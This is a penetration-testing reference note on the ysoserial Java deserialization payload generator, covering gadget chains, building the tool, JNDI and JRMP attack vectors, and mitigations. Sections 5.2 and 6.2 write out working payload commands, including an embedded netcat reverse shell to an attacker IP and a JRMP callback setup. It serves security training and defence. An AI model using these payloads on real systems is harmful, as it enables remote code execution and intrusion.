---
tags: [tools, web-testing, utility, vapt]
difficulty: advanced
module: "59 - Complete Tools Reference"
topic: "59.42 ysoserial Java Deserialization Payload Generator"
---

# 59.42 ysoserial Java Deserialization Payload Generator

## 1. Introduction and Core Capabilities

`ysoserial` is the quintessential exploitation framework for Java Unsafe Deserialization vulnerabilities. Originally released by Chris Frohoff and Gabriel Lawrence, this tool fundamentally altered the landscape of Java security by proving that deserialization of untrusted data is a critical, systemic issue.

In Java, object serialization allows the conversion of object state into a byte stream, which can be transmitted over a network or saved to disk. When an application later deserializes this byte stream back into an object without strict validation, it blindly reconstructs the object's state. 

### 1.1 Why ysoserial?

Exploiting deserialization requires finding specific classes (called "gadgets") within the application's classpath that perform dangerous operations during their restoration process (e.g., inside `readObject()` or `readResolve()`). Manually finding and chaining these gadgets is incredibly complex. `ysoserial` automates this by providing pre-built "Gadget Chains" for popular Java libraries like Commons Collections, Spring, Hibernate, and Groovy.

### 1.2 Primary Features

*   **Pre-compiled Gadget Chains**: Contains dozens of complex exploitation chains for ubiquitous Java libraries.
*   **Format Flexibility**: Outputs payloads as raw binary streams, which can be easily encoded (Base64, Hex) depending on the transport mechanism.
*   **RMI/JNDI Integration**: Can spawn malicious RMI registries or JRMP listeners to exploit sophisticated remote class-loading vectors.
*   **Extensibility**: Open-source nature allows researchers to easily PR new gadget chains as they are discovered.

## 2. Architectural Overview & Attack Flow

The following ASCII diagram maps out the complete execution flow of a typical `ysoserial` attack, from payload generation to remote code execution on the target application.

```text
+-------------------+                          +----------------------+
|                   |   [1] Serialized Data    |                      |
| Attacker Machine  | -----------------------> |  Target Application  |
| (ysoserial.jar)   |   (Raw Bytes, Base64)    |  (Java Backend)      |
+-------------------+                          +----------------------+
          |                                               |
          |                                               v
          |                             +-----------------------------------+
          |                             | ObjectInputStream.readObject()    |
          |                             |                                   |
          v                             |  [2] Gadget Chain Execution       |
+-------------------+                   |  +-----------------------------+  |
| Payload Selection |                   |  | AnnotationInvocationHandler |  |
| - CommonsCollec1  |                   |  |      (Magic Method)         |  |
| - Hibernate1      |                   |  |             |               |  |
| - Spring1         |                   |  |             v               |  |
| - Jdk7u21         |                   |  |      LazyMap.get()          |  |
+-------------------+                   |  |      (Trigger Step)         |  |
          |                             |  |             |               |  |
          |                             |  |             v               |  |
          |                             |  |  ChainedTransformer         |  |
          |                             |  |      (Execution Sink)       |  |
          |                             |  |             |               |  |
          |                             |  |             v               |  |
          |                             |  |  Runtime.exec("calc.exe")   |  |
          +-----------------------------+  +-----------------------------+  |
                                        +-----------------------------------+
```

## 3. Installation and Build Process

`ysoserial` is distributed as a Java Archive (.jar) file. While pre-compiled binaries exist on GitHub, it is often necessary to build it from the source to access the latest gadget chains.

### 3.1 Compiling from Source

Ensure you have Maven and a JDK (preferably Java 8 for maximum compatibility with payload generation) installed.

```bash
# Clone the repository
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial

# Build the project using Maven
mvn clean package -DskipTests

# The executable JAR will be located in the target/ directory
cd target/
java -jar ysoserial-[version]-all.jar
```

## 4. Deep Dive: ObjectInputStream and Magic Methods

To utilize `ysoserial` effectively, one must understand how Java reconstructs objects.

### 4.1 The Role of `readObject()`

When a Java application receives serialized data, it typically uses `java.io.ObjectInputStream` and calls the `readObject()` method. This is the entry point for deserialization. If a class implements `java.io.Serializable`, it can define its own custom `readObject()` method to handle how its state is restored.

### 4.2 The Exploit Catalyst (Magic Methods)

Vulnerabilities occur when these custom `readObject()` methods perform unsafe actions based on the deserialized state. `ysoserial` payloads are carefully constructed serialized objects that exploit these "magic methods". 

When `readObject()` executes, it interacts with the payload's properties, creating a domino effect (the Gadget Chain) that ultimately terminates in a dangerous sink like `Runtime.getRuntime().exec()`.

## 5. Comprehensive Command Reference

The general syntax for generating a payload is straightforward:

`java -jar ysoserial.jar <GadgetChain> <Command>`

### 5.1 Common Gadget Chains

| Gadget Chain | Dependency | Typical Execution Sink |
| :--- | :--- | :--- |
| `CommonsCollections1-7` | Apache Commons Collections | `InvokerTransformer` / `Runtime.exec` |
| `Spring1` / `Spring2` | Spring Framework | `MethodInvokeTypeProvider` |
| `Hibernate1` / `Hibernate2` | Hibernate ORM | `JdbcRowSetImpl` (JNDI Injection) |
| `Groovy1` | Apache Groovy | `MethodClosure` |
| `Jdk7u21` / `JRE8u20` | Native Java Runtime | `TemplatesImpl` |

### 5.2 Payload Generation Examples

**Basic RCE Payload (Raw Bytes):**
```bash
java -jar ysoserial.jar CommonsCollections1 "nc -e /bin/bash 10.0.0.5 4444" > payload.bin
```

**Base64 Encoded Payload (For HTTP Headers/Cookies):**
```bash
java -jar ysoserial.jar CommonsCollections5 "touch /tmp/pwned" | base64 -w0 > payload.b64
```

## 6. Advanced Exploitation Vectors

### 6.1 JNDI Injection via Deserialization

Modern Java runtimes restrict standard command execution gadgets. However, out-of-band network attacks remain viable. Gadgets like `CommonsCollections3` or `Hibernate1` can be used to instantiate objects that perform JNDI lookups.

1.  Start an attacker-controlled RMI/LDAP server using tools like `marshalsec`.
2.  Generate a `ysoserial` payload that forces the target to connect to your server.
3.  The target connects, downloads a malicious remote class, and executes it.

### 6.2 JRMP Client/Listener Attacks

If you cannot achieve direct RCE, you can utilize Java Remote Method Protocol (JRMP) modules within `ysoserial`.

**Setting up a JRMP Listener:**
```bash
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'calc.exe'
```

**Generating the JRMP Client Payload:**
```bash
java -jar ysoserial.jar JRMPClient "10.0.0.5:1099" > payload.bin
```
When the target deserializes the `JRMPClient` payload, it connects back to the attacker's `JRMPListener`, which then delivers the secondary RCE payload.

## 7. Troubleshooting and Common Errors

*   **`ClassNotFoundException`**: The target application does not have the library required by your chosen Gadget Chain in its classpath. You must enumerate the classpath or blind-test different gadgets.
*   **`java.io.InvalidClassException`**: This occurs due to serialVersionUID mismatches. The version of the library on the target server differs slightly from the one used by `ysoserial` to generate the payload.
*   **Security Manager Restrictions**: If the application runs with a strict Java Security Manager, `Runtime.exec()` might be blocked. In this case, try using gadgets that write files to disk or establish outbound network connections for data exfiltration instead of direct command execution.

## 8. Defensive Mitigation and Remediation

Addressing Java deserialization is notoriously difficult because the flaw lies in the architecture of `ObjectInputStream`, not just the vulnerable gadgets.

1.  **Avoid Native Serialization**: The ultimate fix is to migrate away from Java native serialization entirely. Use safer, data-only formats like JSON (via Jackson/Gson) or Protocol Buffers.
2.  **Implement Look-Ahead Object Input Streams**: If serialization must be used, implement a custom `ObjectInputStream` that overrides the `resolveClass()` method. This allows you to enforce a strict whitelist of allowed classes *before* they are instantiated.
3.  **Keep Dependencies Updated**: Regularly patch libraries like Commons Collections, Spring, and Hibernate. While this acts as a band-aid (whack-a-mole with gadgets), it mitigates known public chains.
4.  **Upgrade the JRE**: Ensure the Java Runtime Environment is up-to-date. Newer versions of Java enforce strict codebase restrictions that neutralize many JNDI and remote class-loading attack vectors.

## 9. Chaining Opportunities

*   **[[16 - Remote Code Execution (RCE)]]**: `ysoserial` is the primary bridge between a deserialization flaw and full RCE.
*   **[[32 - Java Management Extensions (JMX) Exploitation]]**: Deserialization payloads can be delivered via exposed JMX endpoints.
*   **[[03 - Server-Side Request Forgery (SSRF)]]**: Triggering deserialization to initiate outbound JNDI lookups, effectively causing SSRF and bypassing internal firewalls.

## 10. Related Notes

*   [[14 - Insecure Deserialization]]
*   [[27 - JNDI and Log4Shell Mechanics]]
*   [[47 - marshalsec Reference]]
*   [[99 - Penetration Testing Cheatsheet]]
